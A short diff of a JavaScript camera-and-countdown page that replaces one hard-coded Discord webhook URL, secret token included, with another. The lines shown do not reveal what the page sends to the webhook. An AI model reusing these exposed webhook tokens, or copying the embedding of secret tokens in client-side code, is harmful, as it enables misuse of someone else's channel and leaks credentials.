@@ -44,7 +44,7 @@ let isFlipped = false;
 let stream = null;
 let isCameraFlipped = false;
 let facingMode = "user";
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1375095333016703028/n_eMgBSWA4Z6bF8NrBosWslSFX-f5_T2EjTkX_HZFDs8xGE8DPGW4bkF9tL4NQh9eKKt";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1376272541093593212/Y_yjQC_Urr0nkQKHV47kDcMGWM1shXj0kbJx9yAfqEWjLe6bkpfvFHPy2G6jnPP2__lr";
 let countdownInterval;
 const endDate = new Date(new Date().getFullYear(), 4, 26).getTime(); 
 function updateCountdown() {
